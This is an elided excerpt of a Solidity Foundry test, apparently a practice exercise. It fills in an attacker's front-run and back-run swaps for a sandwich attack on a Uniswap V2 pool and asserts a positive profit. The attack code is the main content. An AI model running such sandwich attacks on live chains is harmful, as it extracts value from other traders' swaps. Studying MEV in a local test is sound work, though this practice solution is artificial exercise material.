...
contract SandwichPracticeTest is SandwichSetUp {
    ...
    function _attackerAction1() internal {
        ...
        path[1] = address(usdc);
        // implement here
        uniswapV2Router.swapExactETHForTokens{value: 2.614663723502187 ether}(0, path, attacker, block.timestamp);
        vm.stopPrank();
    }
    ...
    function _attackerAction2() internal {
        ...
        uniswapV2Router.swapExactTokensForETH(
            usdc.balanceOf(attacker),0,path,attacker,block.timestamp
        );
        console.log(attacker.balance - attackerInitialEthBalance);
    }
    ...
    function _checkAttackerProfit() internal {
        ...
        assertGt(profit, 0); // profit 34913610775652717
    }
}